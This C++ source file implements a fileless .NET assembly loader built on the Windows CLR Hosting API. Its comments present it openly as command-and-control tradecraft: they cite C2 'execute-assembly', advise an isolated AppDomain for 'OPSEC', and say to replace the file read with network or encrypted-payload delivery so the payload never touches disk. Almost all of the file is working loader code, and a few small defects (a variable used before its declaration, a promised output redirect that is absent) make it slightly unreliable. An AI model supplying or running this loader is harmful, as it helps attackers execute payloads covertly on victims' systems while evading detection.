// CLR Host Assembly Loader
// Loads .NET assemblies reflectively via the CLR Hosting API — no disk touch.
// Compile: cl.exe /EHsc clr_host_loader.cpp /link mscoree.lib oleaut32.lib ole32.lib
//
// This is the same fundamental technique behind execute-assembly in most C2 frameworks.
// The CLR is loaded into the current (unmanaged) process, an AppDomain is created,
// and the assembly is loaded from a byte array via AppDomain.Load().

#include <windows.h>
#include <metahost.h>
#include <mscoree.h>
#include <stdio.h>

#pragma comment(lib, "mscoree.lib")

#import "mscorlib.tlb" raw_interfaces_only \
    high_property_prefixes("_get","_put","_putref") \
    rename("ReportEvent", "InteropServices_ReportEvent")

using namespace mscorlib;

// Redirect Console.Out and Console.Error so we capture managed output
// in the unmanaged process. Without this, output from the loaded assembly
// may vanish depending on how the host process was launched.

HRESULT ExecuteAssemblyFromMemory(
    BYTE* assemblyBytes,
    DWORD assemblySize,
    LPCWSTR runtimeVersion,  // e.g. L"v4.0.30319"
    int argc,
    LPCWSTR* argv
) {
    HRESULT hr;
    ICLRMetaHost* pMetaHost = NULL;
    ICLRRuntimeInfo* pRuntimeInfo = NULL;
    ICorRuntimeHost* pCorRuntimeHost = NULL;
    IUnknownPtr pAppDomainThunk = NULL;
    _AppDomainPtr pDefaultAppDomain = NULL;
    _AssemblyPtr pAssembly = NULL;
    _MethodInfoPtr pEntryPoint = NULL;

    // Step 1: Get the CLR metahost
    hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&pMetaHost);
    if (FAILED(hr)) {
        fprintf(stderr, "[!] CLRCreateInstance failed: 0x%08x\n", hr);
        goto cleanup;
    }

    // Step 2: Get the runtime for the target CLR version
    hr = pMetaHost->GetRuntime(runtimeVersion, IID_ICLRRuntimeInfo, (LPVOID*)&pRuntimeInfo);
    if (FAILED(hr)) {
        fprintf(stderr, "[!] GetRuntime failed: 0x%08x\n", hr);
        goto cleanup;
    }

    // Step 3: Check if the runtime is loadable
    BOOL bLoadable;
    hr = pRuntimeInfo->IsLoadable(&bLoadable);
    if (FAILED(hr) || !bLoadable) {
        fprintf(stderr, "[!] Runtime not loadable: 0x%08x\n", hr);
        goto cleanup;
    }

    // Step 4: Get the ICorRuntimeHost interface (preferred over ICLRRuntimeHost
    // because it exposes AppDomain manipulation needed for Assembly.Load(byte[]))
    hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (LPVOID*)&pCorRuntimeHost);
    if (FAILED(hr)) {
        fprintf(stderr, "[!] GetInterface(ICorRuntimeHost) failed: 0x%08x\n", hr);
        goto cleanup;
    }

    // Step 5: Start the CLR
    hr = pCorRuntimeHost->Start();
    if (FAILED(hr)) {
        fprintf(stderr, "[!] CLR Start failed: 0x%08x\n", hr);
        goto cleanup;
    }

    // Step 6: Get the default AppDomain
    hr = pCorRuntimeHost->GetDefaultDomain(&pAppDomainThunk);
    if (FAILED(hr)) {
        fprintf(stderr, "[!] GetDefaultDomain failed: 0x%08x\n", hr);
        goto cleanup;
    }

    hr = pAppDomainThunk->QueryInterface(IID_PPV_ARGS(&pDefaultAppDomain));
    if (FAILED(hr)) {
        fprintf(stderr, "[!] QueryInterface(AppDomain) failed: 0x%08x\n", hr);
        goto cleanup;
    }

    // Step 7: Load the assembly from the byte array
    {
        SAFEARRAYBOUND bounds;
        bounds.cElements = assemblySize;
        bounds.lLbound = 0;
        SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, &bounds);
        if (!pSafeArray) {
            fprintf(stderr, "[!] SafeArrayCreate failed\n");
            hr = E_OUTOFMEMORY;
            goto cleanup;
        }

        void* pvData = NULL;
        hr = SafeArrayAccessData(pSafeArray, &pvData);
        if (FAILED(hr)) {
            SafeArrayDestroy(pSafeArray);
            goto cleanup;
        }
        memcpy(pvData, assemblyBytes, assemblySize);
        SafeArrayUnaccessData(pSafeArray);

        hr = pDefaultAppDomain->Load_3(pSafeArray, &pAssembly);
        SafeArrayDestroy(pSafeArray);

        if (FAILED(hr)) {
            fprintf(stderr, "[!] AppDomain.Load(byte[]) failed: 0x%08x\n", hr);
            goto cleanup;
        }
    }

    // Step 8: Get and invoke the entry point
    hr = pAssembly->get_EntryPoint(&pEntryPoint);
    if (FAILED(hr)) {
        fprintf(stderr, "[!] get_EntryPoint failed: 0x%08x\n", hr);
        goto cleanup;
    }

    {
        // Build the arguments SAFEARRAY for Main(string[] args)
        SAFEARRAY* psaArgs = NULL;
        VARIANT vtArgs;
        VariantInit(&vtArgs);

        if (argc > 0 && argv != NULL) {
            SAFEARRAYBOUND argsBound;
            argsBound.cElements = argc;
            argsBound.lLbound = 0;
            SAFEARRAY* psaStringArgs = SafeArrayCreate(VT_BSTR, 1, &argsBound);

            for (int i = 0; i < argc; i++) {
                long index = i;
                BSTR bstrArg = SysAllocString(argv[i]);
                SafeArrayPutElement(psaStringArgs, &index, bstrArg);
                SysFreeString(bstrArg);
            }

            vtArgs.vt = VT_ARRAY | VT_BSTR;
            vtArgs.parray = psaStringArgs;
        }

        // The entry point expects a SAFEARRAY of VARIANT with one element
        // containing the string[] args
        SAFEARRAYBOUND paramBound;
        paramBound.cElements = 1;
        paramBound.lLbound = 0;
        psaArgs = SafeArrayCreate(VT_VARIANT, 1, &paramBound);
        long idx = 0;
        SafeArrayPutElement(psaArgs, &idx, &vtArgs);

        VARIANT vtResult;
        VariantInit(&vtResult);

        hr = pEntryPoint->Invoke_3(vtEmpty, psaArgs, &vtResult);

        if (vtArgs.vt != VT_EMPTY) {
            SafeArrayDestroy(vtArgs.parray);
        }
        SafeArrayDestroy(psaArgs);
        VariantClear(&vtResult);

        if (FAILED(hr)) {
            fprintf(stderr, "[!] EntryPoint Invoke failed: 0x%08x\n", hr);
            goto cleanup;
        }
    }

    printf("[+] Assembly executed successfully\n");

cleanup:
    if (pEntryPoint) pEntryPoint->Release();
    if (pAssembly) pAssembly->Release();
    if (pDefaultAppDomain) pDefaultAppDomain->Release();
    if (pCorRuntimeHost) {
        pCorRuntimeHost->Stop();
        pCorRuntimeHost->Release();
    }
    if (pRuntimeInfo) pRuntimeInfo->Release();
    if (pMetaHost) pMetaHost->Release();

    return hr;
}

// Variant: use a custom AppDomain for isolation (recommended for OPSEC —
// you can unload it afterward to clean up loaded assembly metadata)
HRESULT ExecuteInIsolatedAppDomain(
    BYTE* assemblyBytes,
    DWORD assemblySize,
    LPCWSTR runtimeVersion,
    LPCWSTR appDomainName,
    int argc,
    LPCWSTR* argv
) {
    HRESULT hr;
    ICLRMetaHost* pMetaHost = NULL;
    ICLRRuntimeInfo* pRuntimeInfo = NULL;
    ICorRuntimeHost* pCorRuntimeHost = NULL;
    IUnknown* pAppDomainSetupThunk = NULL;
    IUnknown* pNewDomainThunk = NULL;
    _AppDomainPtr pNewAppDomain = NULL;
    _AssemblyPtr pAssembly = NULL;
    _MethodInfoPtr pEntryPoint = NULL;

    hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&pMetaHost);
    if (FAILED(hr)) goto cleanup;

    hr = pMetaHost->GetRuntime(runtimeVersion, IID_ICLRRuntimeInfo, (LPVOID*)&pRuntimeInfo);
    if (FAILED(hr)) goto cleanup;

    hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (LPVOID*)&pCorRuntimeHost);
    if (FAILED(hr)) goto cleanup;

    hr = pCorRuntimeHost->Start();
    if (FAILED(hr)) goto cleanup;

    // Create an isolated AppDomain
    hr = pCorRuntimeHost->CreateDomain(appDomainName, NULL, &pNewDomainThunk);
    if (FAILED(hr)) {
        fprintf(stderr, "[!] CreateDomain failed: 0x%08x\n", hr);
        goto cleanup;
    }

    hr = pNewDomainThunk->QueryInterface(IID_PPV_ARGS(&pNewAppDomain));
    if (FAILED(hr)) goto cleanup;

    // Load and execute (same as above)
    {
        SAFEARRAYBOUND bounds;
        bounds.cElements = assemblySize;
        bounds.lLbound = 0;
        SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, &bounds);
        void* pvData = NULL;
        SafeArrayAccessData(pSafeArray, &pvData);
        memcpy(pvData, assemblyBytes, assemblySize);
        SafeArrayUnaccessData(pSafeArray);

        hr = pNewAppDomain->Load_3(pSafeArray, &pAssembly);
        SafeArrayDestroy(pSafeArray);
        if (FAILED(hr)) goto cleanup;
    }

    hr = pAssembly->get_EntryPoint(&pEntryPoint);
    if (FAILED(hr)) goto cleanup;

    {
        SAFEARRAYBOUND paramBound;
        paramBound.cElements = 1;
        paramBound.lLbound = 0;
        SAFEARRAY* psaArgs = SafeArrayCreate(VT_VARIANT, 1, &paramBound);

        VARIANT vtStringArgs;
        VariantInit(&vtStringArgs);

        if (argc > 0 && argv != NULL) {
            SAFEARRAYBOUND argsBound;
            argsBound.cElements = argc;
            argsBound.lLbound = 0;
            SAFEARRAY* psaStringArgs = SafeArrayCreate(VT_BSTR, 1, &argsBound);
            for (int i = 0; i < argc; i++) {
                long index = i;
                BSTR bstrArg = SysAllocString(argv[i]);
                SafeArrayPutElement(psaStringArgs, &index, bstrArg);
                SysFreeString(bstrArg);
            }
            vtStringArgs.vt = VT_ARRAY | VT_BSTR;
            vtStringArgs.parray = psaStringArgs;
        }

        long idx = 0;
        SafeArrayPutElement(psaArgs, &idx, &vtStringArgs);

        VARIANT vtResult;
        VariantInit(&vtResult);
        hr = pEntryPoint->Invoke_3(vtEmpty, psaArgs, &vtResult);

        if (vtStringArgs.vt != VT_EMPTY) SafeArrayDestroy(vtStringArgs.parray);
        SafeArrayDestroy(psaArgs);
        VariantClear(&vtResult);
    }

    printf("[+] Assembly executed in isolated AppDomain\n");

    // Unload the AppDomain to clean up
    if (pCorRuntimeHost && pNewDomainThunk) {
        pCorRuntimeHost->UnloadDomain(pNewDomainThunk);
        printf("[+] AppDomain unloaded\n");
    }

cleanup:
    if (pEntryPoint) pEntryPoint->Release();
    if (pAssembly) pAssembly->Release();
    if (pNewAppDomain) pNewAppDomain->Release();
    if (pNewDomainThunk) pNewDomainThunk->Release();
    if (pCorRuntimeHost) {
        pCorRuntimeHost->Stop();
        pCorRuntimeHost->Release();
    }
    if (pRuntimeInfo) pRuntimeInfo->Release();
    if (pMetaHost) pMetaHost->Release();

    return hr;
}

// Demo: read assembly from a file into memory, then execute from the byte array.
// In practice you'd receive this byte array over the network, from an encrypted
// payload, from a resource section, etc. — the point is it never lands as a file.
int wmain(int argc, wchar_t* argv[]) {
    if (argc < 2) {
        printf("Usage: %ls <assembly_path> [args...]\n", argv[0]);
        printf("  The assembly is read into memory and then executed via CLR hosting.\n");
        printf("  In operational use, replace the file read with your delivery mechanism.\n");
        return 1;
    }

    // Read the assembly into a byte array (this is the only disk touch —
    // replace with your network/memory delivery in production)
    HANDLE hFile = CreateFileW(argv[1], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[!] Failed to open %ls\n", argv[1]);
        return 1;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* assemblyBytes = (BYTE*)malloc(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, assemblyBytes, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    printf("[*] Loaded %d bytes into memory\n", fileSize);
    printf("[*] Executing via CLR hosting (no disk write)...\n");

    // Pass remaining command line args to the .NET assembly
    int managedArgc = argc - 2;
    LPCWSTR* managedArgv = (argc > 2) ? (LPCWSTR*)&argv[2] : NULL;

    HRESULT hr = ExecuteInIsolatedAppDomain(
        assemblyBytes,
        fileSize,
        L"v4.0.30319",
        L"IsolatedDomain",
        managedArgc,
        managedArgv
    );

    free(assemblyBytes);

    return SUCCEEDED(hr) ? 0 : 1;
}

// vtEmpty is used as the 'this' parameter for static entry point invocation
static VARIANT vtEmpty = { VT_EMPTY };
